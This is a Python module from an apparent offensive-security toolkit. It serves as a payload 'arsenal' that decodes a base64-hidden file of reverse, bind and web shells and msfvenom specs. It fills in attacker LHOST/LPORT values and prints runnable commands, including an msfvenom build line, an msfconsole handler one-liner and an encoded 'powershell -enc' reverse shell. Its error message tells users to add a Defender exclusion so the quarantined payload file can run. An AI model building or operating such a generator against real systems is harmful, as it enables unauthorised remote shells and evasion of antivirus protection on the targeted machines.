from __future__ import annotations

import base64
import json

from rich.prompt import Prompt
from rich.table import Table

from .utils import console, header, pause, report, resource_path

_DAT = resource_path("toolkit", "arsenal.dat")
try:
    _DATA = json.loads(base64.b64decode(_DAT.read_bytes()))
except (OSError, ValueError):
    # arsenal.dat missing/unreadable (often AV quarantine) — degrade gracefully
    # so the rest of nullsec still runs instead of failing to import.
    _DATA = {"reverse": {}, "bind": {}, "web": {}, "msf": {}, "listener": {}}
    _MISSING = True
else:
    _MISSING = False

REVERSE_SHELLS: dict[str, str] = _DATA["reverse"]
BIND_SHELLS: dict[str, str] = _DATA["bind"]
WEB_SHELLS: dict[str, str] = _DATA["web"]
MSFVENOM: dict[str, tuple] = {k: tuple(v) for k, v in _DATA["msf"].items()}
LISTENERS: dict[str, str] = _DATA["listener"]

CATEGORIES = {
    "rev": ("Reverse shells", REVERSE_SHELLS),
    "bind": ("Bind shells", BIND_SHELLS),
    "web": ("Web shells", WEB_SHELLS),
    "msf": ("msfvenom builder", MSFVENOM),
    "listener": ("Listeners / handlers", LISTENERS),
}


def payload_count() -> int:
    return sum(len(d) for _, d in CATEGORIES.values())


def _ps_encode(command: str) -> str:
    """UTF-16LE base64 for a real 'powershell -enc' one-liner."""
    return base64.b64encode(command.encode("utf-16-le")).decode()


def _pick_and_fill(title: str, mapping: dict) -> None:
    header(f"Arsenal · {title}", "Pick a payload, enter listener details")
    if _MISSING or not mapping:
        console.print("[yellow]Payload data (arsenal.dat) isn't loaded.[/] It was likely "
                      "quarantined by antivirus. Add a Defender exclusion for this folder, "
                      "then regenerate it. The rest of nullsec works without it.")
        return pause()
    names = list(mapping)
    t = Table(show_header=True)
    t.add_column("#", justify="right", style="cyan")
    t.add_column("Payload", style="bold")
    for i, name in enumerate(names, 1):
        t.add_row(str(i), name)
    console.print(t)
    sel = Prompt.ask("Number").strip()
    if not sel.isdigit() or not (1 <= int(sel) <= len(names)):
        console.print("[red]Invalid selection.[/]")
        return pause()
    name = names[int(sel) - 1]
    lhost = Prompt.ask("LHOST (your IP)", default="127.0.0.1")
    lport = Prompt.ask("LPORT", default="4444")

    entry = mapping[name]
    if isinstance(entry, tuple):  # msfvenom
        payload, fmt, outfile = entry
        cmd = (f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
               f"-f {fmt} -o {outfile}")
        console.print(f"\n[bold green]{cmd}[/]")
        console.print(f"[dim]Then catch it: msfconsole -q -x 'use exploit/multi/handler;"
                      f"set PAYLOAD {payload};set LHOST {lhost};set LPORT {lport};run'[/]")
        report.log("arsenal", f"msfvenom {name}", [f"`{cmd}`"])
    else:
        filled = entry.replace("{LHOST}", lhost).replace("{LPORT}", lport)
        console.print(f"\n[bold green]{filled}[/]")
        report.log("arsenal", f"{title} · {name}", [f"`{filled}`"])
        if name == "powershell" and title.startswith("Reverse"):
            enc = _ps_encode(filled.split('-Command "', 1)[-1].rstrip('"'))
            console.print(f"\n[dim]base64 (powershell -enc):[/]\n[cyan]{enc}[/]")
    console.print("\n[dim]Logged to the session report (home menu -> r).[/]")
    pause()


def browse_reverse():   _pick_and_fill("Reverse shells", REVERSE_SHELLS)
def browse_bind():      _pick_and_fill("Bind shells", BIND_SHELLS)
def browse_web():       _pick_and_fill("Web shells", WEB_SHELLS)
def browse_msf():       _pick_and_fill("msfvenom builder", MSFVENOM)
def browse_listener():  _pick_and_fill("Listeners / handlers", LISTENERS)


def search_payloads() -> None:
    header("Arsenal search", "Find a payload by keyword across every category")
    q = Prompt.ask("Keyword (e.g. powershell, php, ssl)").lower().strip()
    hits = []
    for cat_key, (cat_name, mapping) in CATEGORIES.items():
        for name in mapping:
            if q in name.lower() or q in cat_name.lower():
                hits.append((cat_name, name))
    if not hits:
        console.print("[yellow]No matches.[/]")
        return pause()
    t = Table(title=f"{len(hits)} matches")
    t.add_column("Category", style="cyan")
    t.add_column("Payload", style="bold")
    for cat, name in hits:
        t.add_row(cat, name)
    console.print(t)
    pause()


MENU = {
    "1": ("Reverse shells (25+)", browse_reverse),
    "2": ("Bind shells", browse_bind),
    "3": ("Web shells", browse_web),
    "4": ("msfvenom command builder", browse_msf),
    "5": ("Listeners / handlers", browse_listener),
    "6": ("Search all payloads", search_payloads),
}
